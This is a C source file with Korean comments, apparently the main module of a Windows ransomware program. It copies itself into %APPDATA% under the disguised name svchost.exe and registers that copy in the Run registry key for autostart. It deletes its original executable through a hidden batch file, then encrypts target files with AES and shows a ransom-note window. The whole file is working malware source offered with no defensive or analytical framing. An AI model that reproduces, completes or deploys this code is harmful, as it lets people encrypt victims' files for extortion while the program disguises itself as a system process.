#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include "encryptor.h"
#include "walker.h"
#include "ransomenote.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16

#define REG_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_NAME "WinUpdater"
#define INSTALL_DIR_NAME "winupdater"
#define INSTALL_EXE_NAME "svchost.exe"   // 위장된 실행 파일 이름
#define LOG_FILENAME "setup_log.txt"

// 로그 기록
void log_status(const char* message) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char* last = strrchr(path, '\\');
    if (last) {
        *(last + 1) = '\0';
        strcat(path, LOG_FILENAME);
        FILE* fp = fopen(path, "a");
        if (fp) {
            fprintf(fp, "[LOG] %s\n", message);
            fclose(fp);
        }
    }
}

// AppData에 복사
BOOL copy_self_to_appdata(char* out_target_path) {
    char self[MAX_PATH], appdata[MAX_PATH];
    GetModuleFileNameA(NULL, self, MAX_PATH);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);

    // 복사 경로: %APPDATA%\winupdater\svchost.exe
    sprintf(out_target_path, "%s\\%s\\%s", appdata, INSTALL_DIR_NAME, INSTALL_EXE_NAME);
    CreateDirectoryA(appdata, NULL);  // 중복 생성 안전
    char target_dir[MAX_PATH];
    sprintf(target_dir, "%s\\%s", appdata, INSTALL_DIR_NAME);
    CreateDirectoryA(target_dir, NULL);  // winupdater 폴더 생성

    if (CopyFileA(self, out_target_path, FALSE)) {
        log_status("파일 복사 성공");
        return TRUE;
    }
    else {
        log_status("파일 복사 실패");
        return FALSE;
    }
}

// 레지스트리에 자동실행 등록
void register_autorun(const char* exe_path) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, REG_NAME, 0, REG_SZ, (BYTE*)exe_path, (DWORD)(strlen(exe_path) + 1));
        RegCloseKey(hKey);
        log_status("레지스트리 등록 성공");
    }
    else {
        log_status("레지스트리 등록 실패");
    }
}

// 자기 삭제 예약 배치 파일 생성 및 실행
void schedule_self_delete(const char* self_path, const char* target_dir) {
    if (DeleteFileA(self_path)) {
        log_status("실행 원본 삭제 성공");
        return;
    }
    log_status("실행 원본 삭제 실패");

    char bat_path[MAX_PATH];
    sprintf(bat_path, "%s\\delself.bat", target_dir);

    FILE* fp = fopen(bat_path, "w");
    if (fp) {
        fprintf(fp,
            ":Repeat\n"
            "del \"%s\"\n"
            "if exist \"%s\" goto Repeat\n"
            "del \"%%~f0\"\n", self_path, self_path);
        fclose(fp);
        ShellExecuteA(NULL, "open", bat_path, NULL, NULL, SW_HIDE);
        log_status("삭제 예약 배치파일 실행");
    }
    else {
        log_status("배치파일 생성 실패");
    }
}

// 자동실행 설치 절차
void setup_persistence() {
    char target_path[MAX_PATH];
    if (copy_self_to_appdata(target_path)) {
        register_autorun(target_path);
    }

    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    // target_dir = 복사된 경로에서 파일명 제외
    char target_dir[MAX_PATH];
    strcpy(target_dir, target_path);
    char* p = strrchr(target_dir, '\\');
    if (p) *p = '\0';

    schedule_self_delete(self_path, target_dir);
}

// 진입점
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char aes_key[AES_KEY_SIZE];
    unsigned char iv[IV_SIZE];

    setup_persistence();                    // 자동실행 + 자기복제 + 로그
    restore_key(aes_key);                   // 키 복원
    restore_iv(iv);                         // IV 복원
    encrypt_all_targets(aes_key, iv);       // 전체 파일 암호화
    create_ransom_note();                   // 랜섬노트 GUI

    return 0;
}
